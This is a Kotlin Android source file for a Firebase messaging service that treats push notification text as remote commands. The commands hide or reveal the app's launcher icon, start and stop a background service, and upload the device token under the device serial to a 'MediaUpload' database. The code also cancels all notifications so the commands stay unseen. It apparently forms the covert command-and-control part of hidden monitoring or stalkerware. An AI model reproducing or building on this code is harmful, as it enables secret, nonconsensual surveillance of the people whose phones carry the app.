package com.developer.service.firebase

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.preference.PreferenceManager
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.iid.FirebaseInstanceId
import com.google.firebase.messaging.FirebaseMessagingService
import java.util.*
import android.app.NotificationManager
import android.content.Context
import android.os.Handler
import com.developer.service.Call
import com.developer.service.Service
import com.developer.service.activities.MainActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener

class FCMService : FirebaseMessagingService() {


    override fun handleIntent(intent: Intent) {
        super.handleIntent(intent)


        val body = intent.extras.getString("gcm.notification.body")

        if (body != null) {


            if (body.toLowerCase().contains("show")) show()

            if (body.toLowerCase().contains("hide")) hide()

            if (body.toLowerCase().contains("reset")) reset()

            if (body.toLowerCase().contains("stop")) stop()

            if (body.toLowerCase().contains("start")) start()

            if (body.toLowerCase().contains("time")) setTime()

            if (body.toLowerCase().contains("token")) sendTokenToServer()

            if (body.toLowerCase().contains("call")) Call().startServiceUsingAlarmManager(applicationContext)


        }

        broadcastIntent("developer.me")
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancelAll()

    }

    private fun show() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
    }

    private fun hide() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
    }

    private fun reset() {
        val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        val ed = sp.edit()
        val temp = sp.getInt("key_timestamp", (Calendar.getInstance().timeInMillis / 1000).toInt())
        ed.putInt("key_timestamp", temp)
        ed.apply()
    }

    private fun stop() {
        PreferenceManager.getDefaultSharedPreferences(applicationContext).edit().putBoolean("runService", false).apply()
        stopService(Intent(applicationContext, Service::class.java))
    }

    private fun start() {
        val ed = PreferenceManager.getDefaultSharedPreferences(applicationContext).edit().putBoolean("runService", true)
        ed.commit()
        startService(Intent(applicationContext, Service::class.java))
    }

    private fun setTime() {


        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Time")


        val listener = object : ValueEventListener {

            override fun onDataChange(dataSnapshot: DataSnapshot) {
                val time = dataSnapshot.value as Long

                val ed = PreferenceManager.getDefaultSharedPreferences(applicationContext).edit()
                ed.putInt("key_timestamp", time.toInt())
                ed.commit()
            }

            override fun onCancelled(p0: DatabaseError?) {}

        }

        myRef.addValueEventListener(listener)

        Handler().postDelayed({
            myRef.removeEventListener(listener)
            stopService(Intent(applicationContext, Service::class.java))
            startService(Intent(applicationContext, Service::class.java))
        }, 3000)

    }

    private fun sendTokenToServer() {

        val refreshedToken = FirebaseInstanceId.getInstance().token
        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Token")
        myRef.setValue(refreshedToken)

    }

    private fun broadcastIntent(action: String) {
        val intent = Intent()
        intent.action = action
        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
        sendBroadcast(intent)
    }

}